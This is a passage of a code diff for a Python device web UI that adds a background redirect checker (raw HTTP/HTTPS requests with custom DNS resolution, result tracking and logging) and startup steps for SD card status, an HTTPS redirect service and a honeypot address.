+    """One GET to ip. Returns (status, location). TLS checks the certificate for the host name."""
+    raw = socket.create_connection((ip, port), timeout=timeout)
+    sock = raw
+    try:
+        if scheme == "https":
+            sock = ssl.create_default_context().wrap_socket(raw, server_hostname=host)
+        sock.sendall(("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: GhostLink-check\r\nConnection: close\r\n\r\n"
+                      % (path, host)).encode("ascii", "replace"))
+        buf = b""
+        while b"\r\n\r\n" not in buf and len(buf) < 16384:
+            chunk = sock.recv(4096)
+            if not chunk:
+                break
+            buf += chunk
+    finally:
+        sock.close()
+    lines = buf.split(b"\r\n\r\n", 1)[0].decode("latin-1", "replace").split("\r\n")
+    parts = lines[0].split()
+    status = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
+    loc = ""
+    for line in lines[1:]:
+        if line.lower().startswith("location:"):
+            loc = line.split(":", 1)[1].strip()
+    return status, loc
+
+
+def _trace(start, dns_server):
+    """Follow redirects from start, up to CHECK_MAX_HOPS. Returns (final url, hops, error)."""
+    hops, cur = [], start
+    for _ in range(CHECK_MAX_HOPS):
+        p = urlparse(cur)
+        scheme = (p.scheme or "https").lower()
+        host = (p.hostname or "").lower()
+        port = p.port or (443 if scheme == "https" else 80)
+        path = (p.path or "/") + (("?" + p.query) if p.query else "")
+        ip = dnsq.resolve(host, dns_server)
+        status, loc = _fetch(scheme, host, port, path, ip)
+        hops.append({"url": cur, "status": status})
+        if status in (301, 302, 303, 307, 308) and loc:
+            cur = urljoin(cur, loc)
+            continue
+        return cur, hops, ""
+    return cur, hops, "more than %d redirects" % CHECK_MAX_HOPS
+
+
+def _run_checks():
+    try:
+        cfg = load_cfg()
+        to = (cfg.get("REDIRECT_TO", "") or "").strip()
+        hosts, _ = redirect_hosts(cfg.get("REDIRECT_FROM", "") or "")
+        starts = []
+        if to:
+            starts.append(to if "://" in to else "https://" + to)
+        starts += ["https://%s/" % h for h in hosts[:CHECK_MAX_HOSTS]]
+        upstream = [s.strip() for s in (cfg.get("DNS_UPSTREAM", "") or "").split(",") if s.strip()] or ["1.1.1.1"]
+        results = []
+        for start in starts:
+            for attempt in range(1, CHECK_ATTEMPTS + 1):
+                try:
+                    final, hops, err = _trace(start, upstream[0])
+                except Exception as e:
+                    final, hops, err = start, [], "%s: %s" % (type(e).__name__, str(e)[:120])
+                results.append({"from": start, "attempt": attempt, "final": final, "hops": hops, "error": err})
+                with _CHECK_LOCK:
+                    REDIRECT_CHECK["results"] = list(results)
+                try:
+                    with open(LOG_PATH, "a") as f:
+                        f.write(f"{time.strftime('%H:%M:%S')} webui check {start} try {attempt}: "
+                                + (err if err else f"ends at {final}") + "\n")
+                except Exception:
+                    pass
+    finally:
+        with _CHECK_LOCK:
+            REDIRECT_CHECK.update(running=False, finished=int(time.time()))
+
+
+def _start_redirect_check():
+    with _CHECK_LOCK:
+        if REDIRECT_CHECK["running"]:
+            return False
+        REDIRECT_CHECK.update(running=True, started=int(time.time()), finished=0, results=[])
+    try:
+        threading.Thread(target=_run_checks, daemon=True).start()
+    except Exception:
+        # If the thread cannot start, nothing will clear "running", and every later check would refuse.
+        with _CHECK_LOCK:
+            REDIRECT_CHECK.update(running=False)
+        return False
+    return True
 
 
 class Server(socketserver.ThreadingMixIn, http.server.HTTPServer):
@@ -4963,7 +6102,18 @@ def main():
     if s is None:
         sys.stderr.write(f"webui: giving up on {bind}:{port}, another instance owns it\n")
         return
+    _sd = sd_status()
+    if _sd["mounted"]:
+        _sd_text = "mounted at %s, %d MB" % (_sd["mount"], _sd["size_mb"])
+    else:
+        _sd_text = "inserted, not mounted" if _sd["present"] else "not detected"
+    sys.stderr.write(f"sd card: {_sd_text}\n")
     sys.stderr.write(f"webui listening {bind}:{port}\n")
+    try:
+        _start_https(bind)
+    except Exception as e:
+        sys.stderr.write(f"https redirect: not started ({e})\n")
+    threading.Thread(target=_auto_add_loop, daemon=True).start()
     # Apply honeypot IP at startup so the secondary address survives a
     # webui restart without the admin having to toggle in the UI.
     try: _honeypot_apply_ip(cfg)
